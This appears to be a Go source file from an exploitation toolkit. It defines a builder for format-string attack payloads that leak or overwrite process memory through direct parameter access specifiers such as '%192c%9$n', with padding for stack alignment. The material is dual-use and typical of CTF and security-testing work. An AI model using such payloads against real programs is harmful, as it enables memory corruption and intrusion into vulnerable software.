package memory

import (
	"bytes"
	"fmt"
	"strconv"
)

// formatStringBuilder helps with constructing a format string as used
// by the format C function family. Specifically, it aims to assist in
// building strings that can leak or write memory. The format strings
// built by this struct's methods are generally of the structure:
//	<specifiers><delim><return-data><delim><additional-data><padding><string-delim>
//
// Refer to the package-level documentation for more information on using
// format strings to read and write memory.
type formatStringBuilder struct {
	returnDataDelim  []byte
	endOfStringDelim []byte
}

// buildDPA builds a direct parameter access (DPA) format string for the
// specified parameter number and format specifiers, padded to the specified
// string length.
//
// The resulting string is going to look like this:
//     [format-string][padding][address-or-argument-data]
//
// The "padding" is required because of the format
// string parameter specifier. As it grows, it could
// potentially mess up the alignment of the stack,
// which will make finding the oracle very difficult.
func (o formatStringBuilder) buildDPA(paramNumber int, specifiers []byte, alignmentLen int) []byte {
	temp := bytes.NewBuffer(nil)
	o.appendDPALeak(paramNumber, specifiers, temp)
	return o.build(alignmentLen, temp)
}

// appendDPAWrite appends a direct parameter access (DPA) string to buff
// that will write a number to the specified parameter number to the format
// string function. This is accomplished by combining the "%<width>c"
// specifier, which will write the specified number of characters to stdout,
// and "%<parameter-number>$<width-specifier>n", which writes the number
// of characters written to stdout to some number of bytes at the address
// of the parameter number.
//
// For example '%192c%9$n' would write base-10 192 to the 9th parameter
// of the format string function.
func (o formatStringBuilder) appendDPAWrite(numBytes int, paramNum int, specifiers []byte, buff *bytes.Buffer) {
	buff.WriteByte('%')
	buff.WriteString(strconv.Itoa(numBytes))
	buff.WriteByte('c')
	o.appendDPALeak(paramNum, specifiers, buff)
}

// appendDPALeak appends a direct parameter access (DPA) string to buff that
// can be used to leak the value at the specified parameter number. The format
// specifiers can be customized such that the function can be used to create
// a memory leak, or a memory write.
func (o formatStringBuilder) appendDPALeak(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
	o.appendPrefix(buff)
	buff.WriteByte('%')
	buff.WriteString(strconv.Itoa(paramNumber))
	buff.WriteByte('$')
	if len(specifiers) > 0 {
		buff.Write(specifiers)
	}
	o.appendSuffix(buff)
}

func (o formatStringBuilder) appendPrefix(buff *bytes.Buffer) {
	buff.Write(o.returnDataDelim)
}

func (o formatStringBuilder) appendSuffix(buff *bytes.Buffer) {
	buff.Write(o.returnDataDelim)
	buff.Write(o.endOfStringDelim)
}

// build constructs a format string from the specified *bytes.Buffer,
// padding it to specified length so that it aligns with the size
// of a pointer on the target system.
func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
	return appendStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
}

func (o formatStringBuilder) isSuitableForLeaking() error {
	if len(o.returnDataDelim) == 0 {
		return fmt.Errorf("prefix and suffix field cannot be empty")
	}
	return nil
}
